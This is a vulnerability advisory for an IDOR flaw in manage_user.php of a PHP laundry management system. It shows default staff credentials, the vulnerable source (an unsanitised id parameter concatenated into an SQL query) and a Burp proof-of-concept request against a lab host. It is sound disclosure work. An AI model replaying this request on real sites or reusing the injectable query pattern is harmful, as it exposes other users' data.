## Online Laundry Management System

## IDOR on `manage_user.php`

### Vendor Homepage:

```
https://www.campcodes.com/downloads/online-laundry-management-system-source-code/
```

### Version:

```
V1.0
```

### Tested on:

```
PHP, Apache, MySQL
```

### Credentials:

```
http://192.168.150.131/login.php
staff
staff
```

### Affected Page:

```
/manage_user.php
```

A vulnerability classified as Insecure Direct Object Reference (IDOR) was discovered on the `manage_user.php` page of a web application. This flaw allows attackers to manipulate URL or HTTP request parameters to bypass access controls and unauthorizedly access other users' information. 

```php
# manage_user.php
include('db_connect.php');
if(isset($_GET['id'])){
	$user = $conn->query("SELECT * FROM users where id =".$_GET['id']);
	foreach($user->fetch_array() as $k =>$v){
		$meta[$k] = $v;
	}
}
```

### Proof of Concept:

**Burp Request:**

```
GET /manage_user.php?id=4 HTTP/1.1
Host: 192.168.150.131
Accept: */*
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0
Referer: http://192.168.150.131/index.php?page=users
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=odflank1n9b26vhfh1heeu1u4j
Connection: close


```

**Screenshot:**

![image-20240512144114233](./screenshot/image-20240512144114233.png)

